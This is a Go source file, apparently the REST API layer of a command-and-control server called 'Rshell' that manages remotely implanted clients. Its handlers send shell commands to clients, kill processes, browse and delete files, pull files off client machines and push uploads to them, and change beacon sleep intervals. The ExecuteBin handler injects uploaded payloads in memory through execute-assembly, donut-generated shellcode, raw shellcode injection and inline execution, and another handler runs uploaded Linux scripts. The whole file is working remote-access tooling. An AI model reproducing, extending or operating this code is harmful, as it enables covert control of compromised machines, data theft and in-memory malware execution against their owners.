package api

import (
	"Rshell/pkg/command"
	"Rshell/pkg/database"
	"Rshell/pkg/godonut"
	"Rshell/pkg/logger"
	"Rshell/pkg/middlewares"
	"Rshell/pkg/response"
	"Rshell/pkg/sendcommand"
	"Rshell/pkg/utils"
	"context"
	"encoding/binary"
	"io"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
)

// @Summary Get all connected clients
// @Tags Clients
// @Accept json
// @Produce json
// @Param page query int false "Page number"
// @Param page_size query int false "Page size"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/clients [get]
// @Security BearerAuth
func GetClients(c *gin.Context) {
	var clientGet struct {
		Page     int `form:"page"`
		PageSize int `form:"page_size"`
	}
	if err := c.ShouldBindQuery(&clientGet); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}

	svc := middlewares.GetServices(c)
	clientData, err := svc.Client.GetClients()
	if err != nil {
		response.InternalError(c)
		return
	}
	clientData2 := utils.Paginate(clientData, clientGet.Page, clientGet.PageSize)
	response.OK(c, gin.H{
		"list":  clientData2,
		"total": len(clientData),
	})
}

// @Summary Send a shell command to a client
// @Tags Clients
// @Accept json
// @Produce json
// @Param uid path string true "Client UID"
// @Param command body object true "Command to execute"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/clients/{uid}/shell/commands [post]
// @Security BearerAuth
func SendCommands(c *gin.Context) {
	uid := c.Param("uid")
	var commands struct {
		Command string `json:"command" binding:"required"`
	}
	if err := c.ShouldBindJSON(&commands); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}

	svc := middlewares.GetServices(c)
	svc.Client.SendShellCommand(uid, commands.Command)

	response.OK(c, nil)
}

// @Summary Get shell output from a client
// @Tags Clients
// @Accept json
// @Produce json
// @Param uid path string true "Client UID"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/clients/{uid}/shell/output [get]
// @Security BearerAuth
func GetShellContent(c *gin.Context) {
	uid := c.Param("uid")
	svc := middlewares.GetServices(c)
	content, err := svc.Client.GetShellContent(uid)
	if err != nil {
		response.InternalError(c)
		return
	}
	response.OK(c, content)
}

// @Summary Get process list from a client
// @Tags Clients
// @Accept json
// @Produce json
// @Param uid path string true "Client UID"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Failure 408 {object} object "timeout"
// @Router /api/v1/clients/{uid}/processes [get]
// @Security BearerAuth
func GetPidList(c *gin.Context) {
	uid := c.Param("uid")
	queue := command.VarPidQueue.GetOrCreateQueue(uid)

	sendcommand.SendCommand(uid, "ps")

	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Second)
	defer cancel()

	select {
	case pids := <-queue:
		pidStruct := utils.ParsePid(pids)
		response.OK(c, pidStruct)
	case <-ctx.Done():
		response.Timeout(c)
	}
}

// @Summary Kill a process on a client
// @Tags Clients
// @Accept json
// @Produce json
// @Param uid path string true "Client UID"
// @Param pid path string true "Process ID"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/clients/{uid}/processes/{pid} [delete]
// @Security BearerAuth
func KillPid(c *gin.Context) {
	uid := c.Param("uid")
	pid := c.Param("pid")
	sendcommand.SendCommand(uid, "kill "+pid)
	response.OK(c, "killed")
}

// @Summary Browse files on a client
// @Tags Clients
// @Accept json
// @Produce json
// @Param uid path string true "Client UID"
// @Param dirPath query string true "Directory path to browse"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Failure 408 {object} object "timeout"
// @Router /api/v1/clients/{uid}/files [get]
// @Security BearerAuth
func FileBrowse(c *gin.Context) {
	uid := c.Param("uid")
	var fileBody struct {
		DirPath string `form:"dirPath" binding:"required"`
	}
	if err := c.ShouldBindQuery(&fileBody); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}
	queue := command.VarFileBrowserQueue.GetOrCreateQueue(uid)
	if strings.HasSuffix(fileBody.DirPath, ":") {
		fileBody.DirPath += "/"
	}
	sendcommand.SendCommand(uid, "filebrowse "+fileBody.DirPath)

	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Second)
	defer cancel()

	select {
	case fileBrowseStr := <-queue:
		fileTree := command.ParseDirectoryString(uid, fileBrowseStr)
		response.OK(c, fileTree)
	case <-ctx.Done():
		response.Timeout(c)
	}
}

// @Summary Delete a file on a client
// @Tags Clients
// @Accept json
// @Produce json
// @Param uid path string true "Client UID"
// @Param filePath query string true "File path to delete"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Failure 408 {object} object "timeout"
// @Router /api/v1/clients/{uid}/files [delete]
// @Security BearerAuth
func FileDelete(c *gin.Context) {
	uid := c.Param("uid")
	var fileBody struct {
		FilePath string `form:"filePath" binding:"required"`
	}
	if err := c.ShouldBindQuery(&fileBody); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}

	queue := command.VarFileBrowserQueue.GetOrCreateQueue(uid)

	var dirPath string
	lastSlashIndex := strings.LastIndex(fileBody.FilePath, "/")
	if lastSlashIndex != -1 {
		dirPath = fileBody.FilePath[:lastSlashIndex+1]
	}
	sendcommand.SendCommand(uid, "filebrowse "+dirPath)

	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Second)
	defer cancel()

	select {
	case fileBrowseStr := <-queue:
		fileTree := command.ParseDirectoryString(uid, fileBrowseStr)
		response.OK(c, fileTree)
	case <-ctx.Done():
		response.Timeout(c)
	}
}

// @Summary Create a directory on a client
// @Tags Clients
// @Accept json
// @Produce json
// @Param uid path string true "Client UID"
// @Param dirPath body object true "Directory path to create"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Failure 408 {object} object "timeout"
// @Router /api/v1/clients/{uid}/files/directories [post]
// @Security BearerAuth
func MakeDir(c *gin.Context) {
	uid := c.Param("uid")
	var dirBody struct {
		DirPath string `json:"dirPath" binding:"required"`
	}
	if err := c.ShouldBindJSON(&dirBody); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}

	queue := command.VarFileBrowserQueue.GetOrCreateQueue(uid)

	var dirPath string
	lastSlashIndex := strings.LastIndex(dirBody.DirPath, "/")
	if lastSlashIndex != -1 {
		dirPath = dirBody.DirPath[:lastSlashIndex+1]
	}
	sendcommand.SendCommand(uid, "filebrowse "+dirPath)

	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Second)
	defer cancel()

	select {
	case fileBrowseStr := <-queue:
		fileTree := command.ParseDirectoryString(uid, fileBrowseStr)
		response.OK(c, fileTree)
	case <-ctx.Done():
		response.Timeout(c)
	}
}

// @Summary Upload a file to a client
// @Tags Clients
// @Accept multipart/form-data
// @Produce json
// @Param uid path string true "Client UID"
// @Param file formData file true "File to upload"
// @Param uploadPath formData string true "Upload destination path"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/clients/{uid}/files/upload [post]
// @Security BearerAuth
func FileUpload(c *gin.Context) {
	file, _ := c.FormFile("file")
	if file == nil {
		response.BadRequest(c, "No file uploaded")
		return
	}
	src, err := file.Open()
	if err != nil {
		response.InternalError(c)
		return
	}
	defer src.Close()

	fileBytes, err := io.ReadAll(src)
	if err != nil {
		response.InternalError(c)
		return
	}

	uid := c.Param("uid")
	uploadPath := c.PostForm("uploadPath")

	uploadPathBytes := []byte(uploadPath)
	uploadPathLen := len(uploadPathBytes)
	uploadPathLenBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(uploadPathLenBytes, uint32(uploadPathLen))
	fileBytesArray := utils.SplitByteArray(fileBytes, 1040500)
	go func() {
		if len(fileBytesArray) == 0 {
			return
		}
		cmd := utils.BytesCombine(uploadPathLenBytes, uploadPathBytes, fileBytesArray[0])
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.UploadStart))
		byteToSend := append(cmdTypeBytes, cmd...)
		sendcommand.SendCommandBytes(uid, byteToSend)

		for _, filebytes := range fileBytesArray[1:] {
			cmdLoop := utils.BytesCombine(uploadPathLenBytes, uploadPathBytes, filebytes)
			cmdTypeBytesLoop := make([]byte, 4)
			binary.BigEndian.PutUint32(cmdTypeBytesLoop, uint32(command.UploadLoop))
			byteToSendLoop := append(cmdTypeBytesLoop, cmdLoop...)
			sendcommand.SendCommandBytes(uid, byteToSendLoop)
		}
	}()
	response.OK(c, nil)
}

// @Summary Get note for a client
// @Tags Clients
// @Accept json
// @Produce json
// @Param uid path string true "Client UID"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/clients/{uid}/note [get]
// @Security BearerAuth
func GetNote(c *gin.Context) {
	uid := c.Param("uid")
	svc := middlewares.GetServices(c)
	note, err := svc.Client.GetNote(uid)
	if err != nil {
		response.InternalError(c)
		return
	}
	response.OK(c, note)
}

// @Summary Save note for a client
// @Tags Clients
// @Accept json
// @Produce json
// @Param uid path string true "Client UID"
// @Param noteContent body object true "Note content to save"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/clients/{uid}/note [put]
// @Security BearerAuth
func SaveNote(c *gin.Context) {
	uid := c.Param("uid")
	var noteBody struct {
		NoteContent string `json:"noteContent" binding:"required"`
	}
	if err := c.ShouldBindJSON(&noteBody); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}
	svc := middlewares.GetServices(c)
	if err := svc.Client.SaveNote(uid, noteBody.NoteContent); err != nil {
		response.InternalError(c)
		return
	}
	response.OK(c, nil)
}

// @Summary Request a file download from a client
// @Tags Clients
// @Accept json
// @Produce json
// @Param uid path string true "Client UID"
// @Param filePath body object true "File path to download"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/clients/{uid}/files/download [post]
// @Security BearerAuth
func DownloadFile(c *gin.Context) {
	uid := c.Param("uid")
	var fileBody struct {
		FilePath string `json:"filePath" binding:"required"`
	}

	if err := c.ShouldBindJSON(&fileBody); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}

	if strings.Contains(uid, "..") || strings.Contains(uid, "/") || strings.Contains(uid, "\\") {
		response.BadRequest(c, "Invalid UID format")
		return
	}

	if fileBody.FilePath == "" || fileBody.FilePath == "." || fileBody.FilePath == ".." {
		response.BadRequest(c, "Invalid file path")
		return
	}

	downloadDir := filepath.Join("./Downloads", uid)
	if err := os.MkdirAll(downloadDir, 0755); err != nil {
		logger.Error("Failed to create download directory: %v", err)
		response.InternalError(c)
		return
	}

	svc := middlewares.GetServices(c)
	if err := svc.Client.InitiateDownload(uid, fileBody.FilePath); err != nil {
		logger.Error("Failed to init download record: %v", err)
		response.InternalError(c)
		return
	}

	sendcommand.SendCommand(uid, "download "+fileBody.FilePath)
	response.OK(c, nil)
}

// @Summary Get download status for a client
// @Tags Clients
// @Accept json
// @Produce json
// @Param uid path string true "Client UID"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/clients/{uid}/downloads [get]
// @Security BearerAuth
func GetDownloadsInfo(c *gin.Context) {
	uid := c.Param("uid")
	svc := middlewares.GetServices(c)
	result, err := svc.Client.GetDownloadsInfoFormatted(uid)
	if err != nil {
		response.InternalError(c)
		return
	}
	response.OK(c, result)
}

// @Summary Fetch a downloaded file from the server
// @Tags Clients
// @Accept json
// @Produce json
// @Param uid path string true "Client UID"
// @Param filePath body object true "File path to fetch"
// @Success 200 {file} binary "File content"
// @Failure 400 {object} object "bad request"
// @Failure 404 {object} object "file not found"
// @Router /api/v1/clients/{uid}/downloads/fetch [post]
// @Security BearerAuth
func DownloadDownloadedFile(c *gin.Context) {
	uid := c.Param("uid")
	var downloadBody struct {
		FilePath string `json:"filePath" binding:"required"`
	}

	if err := c.ShouldBindJSON(&downloadBody); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}

	fullPath, err := utils.GetSafeFilePath(uid, downloadBody.FilePath)
	if err != nil {
		response.BadRequest(c, "Invalid file path")
		return
	}

	if _, err := os.Stat(fullPath); os.IsNotExist(err) {
		response.NotFound(c, "File not found")
		return
	}

	safeFileName := filepath.Base(downloadBody.FilePath)
	safeFileName = strings.ReplaceAll(safeFileName, "/", "")
	safeFileName = strings.ReplaceAll(safeFileName, "\\", "")

	c.Header("Content-Description", "File Transfer")
	c.Header("Content-Transfer-Encoding", "binary")
	c.Header("Content-Disposition", "attachment; filename="+safeFileName)
	c.Header("Content-Type", "application/octet-stream")

	c.File(fullPath)
}

// @Summary List drives on a client
// @Tags Clients
// @Accept json
// @Produce json
// @Param uid path string true "Client UID"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Failure 408 {object} object "timeout"
// @Router /api/v1/clients/{uid}/drives [get]
// @Security BearerAuth
func ListDrives(c *gin.Context) {
	uid := c.Param("uid")

	queue := command.VarDrivesQueue.GetOrCreateQueue(uid)

	sendcommand.SendCommand(uid, "drives")

	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Second)
	defer cancel()

	select {
	case fileBrowseStr := <-queue:
		fileTree := command.ParseDrives(uid, fileBrowseStr)
		response.OK(c, fileTree)
	case <-ctx.Done():
		response.Timeout(c)
	}
}

// @Summary Fetch content of a file on a client
// @Tags Clients
// @Accept json
// @Produce json
// @Param uid path string true "Client UID"
// @Param path query string true "File path to read"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Failure 408 {object} object "timeout"
// @Router /api/v1/clients/{uid}/files/content [get]
// @Security BearerAuth
func FetchFileContent(c *gin.Context) {
	uid := c.Param("uid")
	var contentBody struct {
		FilePath string `form:"path" binding:"required"`
	}
	if err := c.ShouldBindQuery(&contentBody); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}

	queue := command.VarFileContentQueue.GetOrCreateQueue(uid, contentBody.FilePath)

	sendcommand.SendCommand(uid, "filecontent "+contentBody.FilePath)

	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Second)
	defer cancel()

	select {
	case fileContent := <-queue:
		response.OK(c, fileContent)
	case <-ctx.Done():
		response.Timeout(c)
	}
}

// @Summary Disconnect and remove a client
// @Tags Clients
// @Accept json
// @Produce json
// @Param uid path string true "Client UID"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/clients/{uid} [delete]
// @Security BearerAuth
func ExitClient(c *gin.Context) {
	uid := c.Param("uid")
	svc := middlewares.GetServices(c)
	svc.Client.ExitClientAsync(uid)
	response.OK(c, nil)
}

// @Summary Add a note to a client
// @Tags Clients
// @Accept json
// @Produce json
// @Param uid path string true "Client UID"
// @Param note body object true "Note text"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/clients/{uid}/note [post]
// @Security BearerAuth
func AddUidNote(c *gin.Context) {
	uid := c.Param("uid")
	var noteBody struct {
		Note string `json:"note" binding:"required"`
	}
	if err := c.ShouldBindJSON(&noteBody); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}
	svc := middlewares.GetServices(c)
	if err := svc.Client.AddUidNote(uid, noteBody.Note); err != nil {
		response.InternalError(c)
		return
	}
	response.OK(c, nil)
}

// @Summary Edit client sleep interval
// @Tags Clients
// @Accept json
// @Produce json
// @Param uid path string true "Client UID"
// @Param sleep body object true "Sleep interval in seconds"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/clients/{uid}/sleep [put]
// @Security BearerAuth
func EditSleep(c *gin.Context) {
	uid := c.Param("uid")
	var sleepBody struct {
		Sleep string `json:"sleep" binding:"required"`
	}
	if err := c.ShouldBindJSON(&sleepBody); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}
	svc := middlewares.GetServices(c)
	if err := svc.Client.EditSleep(uid, sleepBody.Sleep); err != nil {
		response.InternalError(c)
		return
	}
	sendcommand.SendCommand(uid, "sleep "+sleepBody.Sleep)
	response.OK(c, nil)
}

// @Summary Edit client display color
// @Tags Clients
// @Accept json
// @Produce json
// @Param uid path string true "Client UID"
// @Param color body object true "Color value"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/clients/{uid}/color [put]
// @Security BearerAuth
func EditColor(c *gin.Context) {
	uid := c.Param("uid")
	var colorBody struct {
		Color string `json:"color" binding:"required"`
	}
	if err := c.ShouldBindJSON(&colorBody); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}
	svc := middlewares.GetServices(c)
	if err := svc.Client.EditColor(uid, colorBody.Color); err != nil {
		response.InternalError(c)
		return
	}
	response.OK(c, nil)
}

// @Summary Execute binary on a client
// @Tags Clients
// @Accept multipart/form-data
// @Produce json
// @Param uid path string true "Client UID"
// @Param file formData file true "Binary file to execute"
// @Param args formData string false "Arguments"
// @Param mode formData string true "Execution mode (execute-assembly|inline-bin|shellcode-inject|inline-execute)"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/clients/{uid}/execute [post]
// @Security BearerAuth
func ExecuteBin(c *gin.Context) {
	file, _ := c.FormFile("file")
	if file == nil {
		response.BadRequest(c, "No file uploaded")
		return
	}
	src, err := file.Open()
	if err != nil {
		response.BadRequest(c, "Unable to open file")
		return
	}
	defer src.Close()

	fileBytes, err := io.ReadAll(src)
	if err != nil {
		response.BadRequest(c, "Unable to read file")
		return
	}

	uid := c.Param("uid")
	args := c.PostForm("args")
	mode := c.PostForm("mode")

	svc := middlewares.GetServices(c)
	svc.Client.AppendShellHistory(uid, "$ "+mode+" "+file.Filename+" "+args+"\n")

	switch mode {
	case "execute-assembly":
		fileLength := len(fileBytes)
		fileLengthBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(fileLengthBytes, uint32(fileLength))
		byteToSend := utils.BytesCombine(fileLengthBytes, fileBytes, []byte(args))

		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.ExecuteAssembly))
		byteToSend = append(cmdTypeBytes, byteToSend...)
		sendcommand.SendCommandBytes(uid, byteToSend)
	case "inline-bin":
		var u database.Clients
		database.Engine.Where("uid = ?", uid).Get(&u)

		payload, err := godonut.GenShellcode(fileBytes, args, u.Arch)
		if err != nil {
			response.BadRequest(c, "Unable to generate shellcode")
			return
		}
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.InlineBin))
		byteToSend := utils.BytesCombine(cmdTypeBytes, payload)
		sendcommand.SendCommandBytes(uid, byteToSend)
	case "shellcode-inject":
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.InlineBin))
		byteToSend := utils.BytesCombine(cmdTypeBytes, fileBytes)
		sendcommand.SendCommandBytes(uid, byteToSend)
	case "inline-execute":
		fileLength := len(fileBytes)
		fileLengthBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(fileLengthBytes, uint32(fileLength))
		byteToSend := utils.BytesCombine(fileLengthBytes, fileBytes, []byte(args))
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.InlineExecute))
		byteToSend = append(cmdTypeBytes, byteToSend...)
		sendcommand.SendCommandBytes(uid, byteToSend)
	}
	response.OK(c, nil)
}

// @Summary Execute Linux script on a client
// @Tags Clients
// @Accept multipart/form-data
// @Produce json
// @Param uid path string true "Client UID"
// @Param file formData file true "Script file to execute"
// @Param args formData string false "Arguments"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/clients/{uid}/execute-linux-script [post]
// @Security BearerAuth
func ExecuteLinuxScript(c *gin.Context) {
	file, _ := c.FormFile("file")
	if file == nil {
		response.BadRequest(c, "No file uploaded")
		return
	}
	src, err := file.Open()
	if err != nil {
		response.BadRequest(c, "Unable to open file")
		return
	}
	defer src.Close()

	fileBytes, err := io.ReadAll(src)
	if err != nil {
		response.BadRequest(c, "Unable to read file")
		return
	}

	uid := c.Param("uid")
	args := c.PostForm("args")

	svc := middlewares.GetServices(c)
	svc.Client.AppendShellHistory(uid, "$ execute-linux-sh "+file.Filename+" "+args+"\n")

	fileLength := len(fileBytes)
	fileLengthBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(fileLengthBytes, uint32(fileLength))
	byteToSend := utils.BytesCombine(fileLengthBytes, fileBytes, []byte(args))

	cmdTypeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.ExecuteLinuxScript))
	byteToSend = append(cmdTypeBytes, byteToSend...)
	sendcommand.SendCommandBytes(uid, byteToSend)

	response.OK(c, nil)
}
